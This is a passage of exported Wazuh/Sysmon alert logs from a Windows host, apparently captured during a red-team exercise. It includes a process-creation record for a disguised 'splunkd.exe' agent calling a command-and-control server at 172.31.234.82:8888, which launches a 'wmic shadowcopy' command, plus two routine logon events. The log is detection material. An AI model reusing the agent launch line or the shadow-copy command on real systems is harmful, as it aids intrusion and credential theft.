(WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,1,DESKTOP-QGB4EQH\\mari,"technique_id=T1083,technique_name=File and Directory Discovery", , , , , , , 
+wazuh-alerts-4.x-2024.12.01,BaHWgZMBrrvr6pEb_H1j,1,1,window-agent3,3,Maryam,8,FALSE,4, , , ,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , , ,windows_eventchannel, ,log,"Dec 1, 2024 @ 10:49:25.770",EventChannel,1733050166,"Dec 1, 2024 @ 10:49:25.770",192.168.117.134, , , , , , , ,{15959494-0014-674C-2299-030000000000}, , , , ,8704, , , , , , ,1,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
+RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
+UtcTime: 2024-12-01 10:49:24.926
+ProcessGuid: {15959494-3F34-674C-1806-000000000F00}
+ProcessId: 8704
+Image: C:\Windows\System32\cmd.exe
+FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
+Description: Windows Command Processor
+Product: MicrosoftÂ® WindowsÂ® Operating System
+Company: Microsoft Corporation
+OriginalFileName: Cmd.Exe
+CommandLine: cmd.exe /C wmic /node:""localhost"" shadowcopy call create Volume=C:\
+CurrentDirectory: C:\Windows\system32\
+User: DESKTOP-QGB4EQH\mari
+LogonGuid: {15959494-0014-674C-2299-030000000000}
+LogonId: 0x39922
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
+ParentProcessGuid: {15959494-21B3-674C-8804-000000000F00}
+ParentProcessId: 1808
+ParentImage: C:\Users\Public\splunkd.exe
+ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
+ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-01T10:49:24.929368800Z,144367,5088,DESKTOP-QGB4EQH,1,2348,INFORMATION,Microsoft-Windows-Sysmon,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]",Cmd.Exe,C:\\Windows\\System32\\cmd.exe,MicrosoftÂ® WindowsÂ® Operating System,{15959494-21B3-674C-8804-000000000F00},Windows Command Processor,"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",{15959494-3F34-674C-1806-000000000F00},0x39922,1808,C:\\Windows\\system32\\,49:24.9,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",C:\\Users\\Public\\splunkd.exe,Microsoft Corporation,"cmd.exe /C wmic /node:\""localhost\"" shadowcopy call create Volume=C:\\",High,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,1,DESKTOP-QGB4EQH\\mari,"technique_id=T1059.003,technique_name=Windows Command Shell", , , , , , , 
+wazuh-alerts-4.x-2024.12.01,BqHWgZMBrrvr6pEb_H1j,1,1,window-agent3,3,Maryam,3,FALSE,3,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]",Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""AC.7"",""AU.14""]","[""7.1"",""7.2""]","[""IV_32.2""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:49:26.226",EventChannel,1733050167,"Dec 1, 2024 @ 10:49:26.226",192.168.117.134,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x26c,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$,4624,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		DESKTOP-QGB4EQH$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		5
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+Impersonation Level:		Impersonation
+
+New Logon:
+	Security ID:		S-1-5-18
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+	Linked Logon ID:		0x0
+	Network Account Name:	-
+	Network Account Domain:	-
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x26c
+	Process Name:		C:\Windows\System32\services.exe
+
+Network Information:
+	Workstation Name:	-
+	Source Network Address:	-
+	Source Port:		-
+
+Detailed Authentication Information:
+	Logon Process:		Advapi  
+	Authentication Package:	Negotiate
+	Transited Services:	-
+	Package Name (NTLM only):	-
+	Key Length:		0
+
+This event is generated when a logon session is created. It is generated on the computer that was accessed.
+
+The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+
+The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+
+The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+
+The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+
+The impersonation level field indicates the extent to which a process in the logon session can impersonate.
+
+The authentication information fields provide detailed information about this specific logon request.
+	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+	- Transited services indicate which intermediate services have participated in this logon request.
+	- Package name indicates which sub-protocol was used among the NTLM protocols.
+	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-01T10:49:25.052204300Z,48323,748,DESKTOP-QGB4EQH,12544,660,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , 
+wazuh-alerts-4.x-2024.12.01,B6HWgZMBrrvr6pEb_H1j,1,1,window-agent3,3,Maryam,4,FALSE,3,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]",Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""AC.7"",""AU.14""]","[""7.1"",""7.2""]","[""IV_32.2""]",windows_eventchannel, ,log,"Dec 1, 2024 @ 10:49:26.289",EventChannel,1733050167,"Dec 1, 2024 @ 10:49:26.289",192.168.117.134,0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x26c,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$,4624,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.
+
+Subject:
+	Security ID:		S-1-5-18
+	Account Name:		DESKTOP-QGB4EQH$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Logon Information:
+	Logon Type:		5
+	Restricted Admin Mode:	-
+	Virtual Account:		No
+	Elevated Token:		Yes
+
+Impersonation Level:		Impersonation
+
+New Logon:
+	Security ID:		S-1-5-18
+	Account Name:		SYSTEM
+	Account Domain:		NT AUTHORITY
+	Logon ID:		0x3E7
+	Linked Logon ID:		0x0
+	Network Account Name:	-
+	Network Account Domain:	-
+	Logon GUID:		{00000000-0000-0000-0000-000000000000}
+
+Process Information:
+	Process ID:		0x26c
+	Process Name:		C:\Windows\System32\services.exe
+
+Network Information:
+	Workstation Name:	-
+	Source Network Address:	-
+	Source Port:		-
+
+Detailed Authentication Information:
+	Logon Process:		Advapi  
+	Authentication Package:	Negotiate
+	Transited Services:	-
+	Package Name (NTLM only):	-
+	Key Length:		0
+
+This event is generated when a logon session is created. It is generated on the computer that was accessed.
+
+The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.
+
+The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).
+
+The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.
+
+The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.
+
+The impersonation level field indicates the extent to which a process in the logon session can impersonate.
+
+The authentication information fields provide detailed information about this specific logon request.
+	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
+	- Transited services indicate which intermediate services have participated in this logon request.
+	- Package name indicates which sub-protocol was used among the NTLM protocols.
+	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-12-01T10:49:25.137738700Z,48327,748,DESKTOP-QGB4EQH,12544,660,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , 
